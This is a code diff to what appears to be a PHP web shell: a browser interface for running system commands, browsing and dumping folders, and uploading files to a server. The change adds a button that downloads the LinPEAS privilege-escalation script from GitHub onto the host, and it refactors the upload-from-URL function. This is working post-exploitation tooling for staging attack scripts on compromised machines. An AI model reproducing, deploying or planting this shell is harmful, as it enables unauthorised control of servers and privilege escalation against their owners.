@@ -771,6 +771,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                     <input id="urlUploadName" type="text" placeholder="File Name:">
                     <input id="urlUploadSubmit" class="btn" type="button" value="Submit">
                 </div>
+                <button class="btn" onclick="uploadFromUrl('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')">Upload&nbsp;LinPEAS</button>
                 <button class="btn" id="dumpFolder">Dump&nbsp;Folder</button>
                 <!-- <button class="btn">Clean&nbsp;Up</button> Still have to figure this one out -->
             </div>
@@ -801,6 +802,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
 
 <script>
     document.getElementById('cmdInput').addEventListener('keydown', function (e) {
+        /* CMD input function */
         if (e.key === 'Enter') {
             const cmd = this.value.trim();
             if (!cmd) return;
@@ -843,6 +845,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
     });
 
     function refreshFolder(path, targetElement) {
+        /* REFRESH FOLDER THAT IS CALLED */
         fetch('?path=' + encodeURIComponent(path))
             .then(response => response.text())
             .then(html => {
@@ -851,6 +854,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
     }
 
     document.getElementById('uploadFileInput').addEventListener('change', function() {
+        /* UPLOAD FILE FUNCTION */
         const fileInput = document.getElementById('uploadFileInput');
         const file = fileInput.files[0];
         if (!file) return;
@@ -934,17 +938,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         }
     }
 
-    document.getElementById('urlUploadSubmit').addEventListener('click', () => {
-        const url = document.getElementById('urlUpload').value.trim();
-        const fileName = document.getElementById('urlUploadName').value.trim();
-        const uploadPath = document.getElementsByClassName('selectedPath')[0].value || '/';
+    function uploadFromUrl(customUrl = null, customName = null) {
+        const url = customUrl || document.getElementById('urlUpload').value.trim();
+        const fileName = customName || document.getElementById('urlUploadName').value.trim();
+        const uploadPath = document.getElementsByClassName('selectedPath')[0]?.textContent.trim() || '/';
 
         if (!url || !fileName) {
             alert('Please enter both URL and file name.');
             return;
         }
 
-        // Encode params for GET request
         const params = new URLSearchParams({
             urlUpload: url,
             urlUploadName: fileName,
@@ -959,11 +962,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         .then(data => {
             if (data.success) {
                 alert('URL upload successful!');
-                // Clear inputs
-                document.getElementById('urlUpload').value = '';
-                document.getElementById('urlUploadName').value = '';
+                // Clear inputs if used via UI
+                if (!customUrl && !customName) {
+                    document.getElementById('urlUpload').value = '';
+                    document.getElementById('urlUploadName').value = '';
+                }
 
-                // Optionally refresh folder view here, like after file upload
+                // Optionally refresh folder view
                 const selectedFolder = document.querySelector('.folder.selected');
                 if (selectedFolder) {
                     const nested = selectedFolder.nextElementSibling;
@@ -971,7 +976,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                         refreshFolder(uploadPath, nested);
                     }
                 }
-
             } else {
                 alert('URL upload error: ' + data.error);
             }
@@ -979,6 +983,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         .catch(err => {
             alert('URL upload failed: ' + err.message);
         });
+    }
+
+    document.getElementById('urlUploadSubmit').addEventListener('click', () => {
+        uploadFromUrl();
     });
 
     document.getElementById('file-tree').addEventListener('dblclick', function (e) {
